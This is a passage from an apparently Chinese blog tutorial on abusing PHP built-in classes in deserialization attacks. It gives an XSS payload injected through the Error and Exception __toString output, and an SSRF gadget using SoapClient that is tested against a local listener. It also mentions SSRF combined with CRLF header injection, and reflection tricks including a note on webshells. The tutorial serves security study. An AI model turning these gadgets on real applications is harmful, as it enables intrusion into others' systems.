class="line">InvalidArgumentException::__toString</span><br><span class="line">LengthException::__wakeup</span><br><span class="line">LengthException::__toString</span><br><span class="line">OutOfRangeException::__wakeup</span><br><span class="line">OutOfRangeException::__toString</span><br><span class="line">RuntimeException::__wakeup</span><br><span class="line">RuntimeException::__toString</span><br><span class="line">OutOfBoundsException::__wakeup</span><br><span class="line">OutOfBoundsException::__toString</span><br><span class="line">OverflowException::__wakeup</span><br><span class="line">OverflowException::__toString</span><br><span class="line">RangeException::__wakeup</span><br><span class="line">RangeException::__toString</span><br><span class="line">UnderflowException::__wakeup</span><br><span class="line">UnderflowException::__toString</span><br><span class="line">UnexpectedValueException::__wakeup</span><br><span class="line">UnexpectedValueException::__toString</span><br><span class="line">CachingIterator::__toString</span><br><span class="line">RecursiveCachingIterator::__toString</span><br><span class="line">SplFileInfo::__toString</span><br><span class="line">DirectoryIterator::__toString</span><br><span class="line">FilesystemIterator::__toString</span><br><span class="line">RecursiveDirectoryIterator::__toString</span><br><span class="line">GlobIterator::__toString</span><br><span class="line">SplFileObject::__toString</span><br><span class="line">SplTempFileObject::__toString</span><br><span class="line">SplFixedArray::__wakeup</span><br><span class="line">AssertionError::__wakeup</span><br><span class="line">AssertionError::__toString</span><br><span class="line">SodiumException::__wakeup</span><br><span class="line">SodiumException::__toString</span><br><span class="line">PDOException::__wakeup</span><br><span class="line">PDOException::__toString</span><br><span class="line">DOMException::__wakeup</span><br><span class="line">DOMException::__toString</span><br><span class="line">FFI\Exception::__wakeup</span><br><span class="line">FFI\Exception::__toString</span><br><span class="line">FFI\ParserException::__wakeup</span><br><span class="line">FFI\ParserException::__toString</span><br><span class="line">IntlException::__wakeup</span><br><span class="line">IntlException::__toString</span><br><span class="line">mysqli_sql_exception::__wakeup</span><br><span class="line">mysqli_sql_exception::__toString</span><br><span class="line">PharException::__wakeup</span><br><span class="line">PharException::__toString</span><br><span class="line">Phar::__destruct</span><br><span class="line">Phar::__toString</span><br><span class="line">PharData::__destruct</span><br><span class="line">PharData::__toString</span><br><span class="line">PharFileInfo::__destruct</span><br><span class="line">PharFileInfo::__toString</span><br><span class="line">SimpleXMLElement::__toString</span><br><span class="line">SimpleXMLIterator::__toString</span><br><span class="line">PhpToken::__toString</span><br></pre></td></tr></table></figure>

<p>挑几个重点的说吧：</p>
<h3 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h3><ul>
<li>适用于 php7 版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>给了一个类摘要：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">类属性：</span><br><span class="line"></span><br><span class="line">message：错误消息内容</span><br><span class="line">code：错误代码</span><br><span class="line">file：抛出错误的文件名</span><br><span class="line">line：抛出错误在该文件中的行数</span><br><span class="line">类方法：</span><br><span class="line"></span><br><span class="line">Error::__construct — 初始化 error 对象</span><br><span class="line">Error::getMessage — 获取错误信息</span><br><span class="line">Error::getPrevious — 返回先前的 Throwable</span><br><span class="line">Error::getCode — 获取错误代码</span><br><span class="line">Error::getFile — 获取错误发生时的文件</span><br><span class="line">Error::getLine — 获取错误发生时的行号</span><br><span class="line">Error::getTrace — 获取调用栈（stack trace）</span><br><span class="line">Error::getTraceAsString — 获取字符串形式的调用栈（stack trace）</span><br><span class="line">Error::__toString — error 的字符串表达</span><br><span class="line">Error::__clone — 克隆 error</span><br></pre></td></tr></table></figure>

<p>Error类是 php 的一个内置类，用于自动自定义一个 Error，在 php7 的环境下可能会造成一个 xss 漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个 POP 链走到一半就走不通了，不如尝试利用这个来做一个 xss，直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发 <code>__toString</code> 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;ZLARYY&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p>当我们执行这串代码之后，我们会看到如下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: ZLARYY in D:\phpstudy_pro\WWW\liu.php:2 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>其中ZLARYY字符串部分我们可控，就可能造成XSS漏洞</p>
<p>比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/alert.png" class="" title="alert">

<h3 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h3><ul>
<li>适用于 php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>与Error类完全一样，就不多说了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception: ZLARYY in D:\phpstudy_pro\WWW\liu.php:2 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>但也粘贴一下给的类摘要吧：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">类属性：</span><br><span class="line">message：异常消息内容</span><br><span class="line">code：异常代码</span><br><span class="line">file：抛出异常的文件名</span><br><span class="line">line：抛出异常在该文件中的行号</span><br><span class="line">类方法：</span><br><span class="line">Exception::__construct — 异常构造函数</span><br><span class="line">Exception::getMessage — 获取异常消息内容</span><br><span class="line">Exception::getPrevious — 返回异常链中的前一个异常</span><br><span class="line">Exception::getCode — 获取异常代码</span><br><span class="line">Exception::getFile — 创建异常时的程序文件名称</span><br><span class="line">Exception::getLine — 获取创建的异常所在文件中的行号</span><br><span class="line">Exception::getTrace — 获取异常追踪信息</span><br><span class="line">Exception::getTraceAsString — 获取字符串类型的异常追踪信息</span><br><span class="line">Exception::__toString — 将异常对象转换为字符串</span><br><span class="line">Exception::__clone — 异常克隆</span><br></pre></td></tr></table></figure>

<h3 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h3><p>PHP 的内置类 SoapClient 是一个专门用来访问 Web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。</li>
<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WEB服务的三要素：SOAP WSDL UDDI</span><br><span class="line">1.SOAP:SOAP 协议是一种基于 XML 的协议，用于在 Web 应用程序之间进行交互，主要用于 Web 服务。</span><br><span class="line">2.WSDL:是一种 XML 文档，用于描述 Web 服务。</span><br><span class="line">3.UDDI:是一个用于发布和发现 Web 服务的目录服务，它提供了一种标准的方式来描述 Web 服务的元数据信息，并将这些信息注册到 UDDI 目录中。</span><br></pre></td></tr></table></figure>

<p>我尝试用以下这段代码去触发一个SSRF</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://192.168.1.40:5000&#x27;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://test-uri&#x27;</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/soapclient.png" class="" title="soapclient">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.40 - - [15/Feb/2026 17:08:33] &quot;POST / HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>的确POST一个内容上去 </p>
<p>但是，由于它仅限于 HTTP&#x2F;HTTPS 协议，所以用处不是很大。而如果这里 HTTP 头部还存在 CRLF 漏洞的话，但我们则可以通过 SSRF + CRLF，插入任意的 HTTP 头。</p>
<h3 id="反射类Reflection"><a href="#反射类Reflection" class="headerlink" title="反射类Reflection"></a>反射类Reflection</h3><h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><ul>
<li>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">ReflectionClass</span>::<span class="title function_ invoke__">__construct</span>(<span class="keyword">mixed</span> <span class="variable">$argument</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>比如一下这段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;ZLARYY&#x27;</span>);</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionclass.png" class="" title="reflectionclass">

<p>它能把类里面属性和方法的名字都能够显示出来。</p>
<p>这个类还有一个特别的用处是给私有属性赋值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就比如上述代码中如果我想要给Arach属性赋值true，我可以利用ReflectionClass：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$Arach</span> = <span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;Arach&#x27;</span>);  <span class="comment">//获取名为&#x27;Arach&#x27;的属性（即使它是私有的）</span></span><br><span class="line"><span class="variable">$Arach</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);   <span class="comment">//将私有属性设置为可访问</span></span><br><span class="line"><span class="variable">$Arach</span>-&gt;<span class="title function_ invoke__">setvalue</span>(<span class="variable">$a</span>,<span class="literal">true</span>);  <span class="comment">//将$a对象的Arach属性值设置为true</span></span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionclass2.png" class="" title="reflectionclass2">

<p>通过序列化字符串结果b:1可见Arach成功在类外被赋值为true</p>
<h4 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h4><p>这个内置类可以用来辅助调用匿名函数，其中的invokeArgs()方法也可以用来写webshell</p>
<p>先说调用匿名函数的事吧，如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You absolutely execute it!&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="variable">$func</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">invoke</span>();</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionfunction.png" class="" title="reflectionfunction">

<p>可以看到如果我们新创建了一个ReflectionFunction实例 ，并将函数名放在里面作为参数调用invoke()方法就能实现调用函数，那如果没有$func呢？如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&#x27;echo &quot;You absolutely execute it!&quot;;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>如果我想调用这个create_function该怎么办？</p>
